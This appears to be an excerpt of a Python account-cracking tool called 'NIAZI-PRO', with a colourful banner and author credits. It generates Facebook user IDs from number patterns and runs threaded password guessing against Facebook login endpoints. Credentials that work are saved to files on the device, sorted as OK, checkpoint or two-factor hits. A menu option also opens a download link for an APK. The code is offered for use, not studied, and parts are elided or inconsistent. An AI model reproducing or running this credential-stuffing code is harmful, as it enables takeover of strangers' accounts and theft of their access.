...
\033[1;31m███╗        ██╗ ██╗ █████╗     ███████╗  ██╗
\033[1;32m████╗      ██║██║██╔══██╗╚══███╔╝  ██║
\033[1;33m██╔██╗   ██║██║███████║    ███╔╝       ██║   \033[1;34m𝐏 \033[1;37m
\033[1;34m██║╚██╗██║██║██╔══██║ ███╔╝          ██║\033[1;31m 𝐑\033[1;37m
\033[1;35m██║   ╚████   ██║██║     ██║███████╗   ██║\033[1;35m𝐎 \033[1;37m
 \033[1;36m╚═╝    ╚═══╝╚═╝╚═╝      ╚═╝╚══════╝   ╚═╝                            
----------------------------------------------
 Author    : AALIYAN NIAZI
 Github    : NIAZI786
 Facebook  : AALIYAN NIAZI
 Tool Name : NIAZI-PRO
 Tool type : PAID
----------------------------------------------
 For Haters: Ma Niazi Ho Tumhare Okat Nhi Meri Level tak ana ki 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MANO _VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MANO :     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MANO -XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MANO =session.cookies.get_dict().keys()
                        if "c_user" in MANO :
                                print('\r\r\033[1;32m [MANO -OK] %s | %s'%(ids,pas))
                                open('/sdcard/MANO -OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MANO :
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MANO -CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANO -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MANO -OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANO -OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MANO -2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MANO -OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANO -R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [MANO -CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANO -R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
